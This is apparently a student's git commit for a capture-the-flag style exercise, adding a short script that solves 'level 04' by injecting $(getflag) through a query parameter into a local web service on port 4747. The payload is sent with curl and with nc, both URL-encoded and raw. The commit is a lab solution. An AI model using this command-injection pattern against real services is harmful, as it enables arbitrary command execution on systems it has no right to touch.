476be6bc2f61e8c8b9385bbba1f0dd733f8b3b51
mhufflep <mhufflep@student.21-school.ru>
2022-09-29 03:43:09 +0500

    level 04 passed

---
+++ level04/Resources/cmd.sh
@@ -0,0 +1,15 @@
+
+# URL encoder
+# https://www.urlencoder.org/
+
+# %24%28getflag%29 == URL-encoded $(getflag)
+
+# As simple as that
+curl http://localhost:4747?x=%24%28getflag%29
+
+# Or with nc
+echo -e "GET /?x=%24%28getflag%29 HTTP/1.1\nHost:localhost\n\n" | nc localhost 4747
+
+# Without encoding
+echo -e 'GET /?x=$(getflag) HTTP/1.1\nHost:localhost\n\n' | nc localhost 4747
+
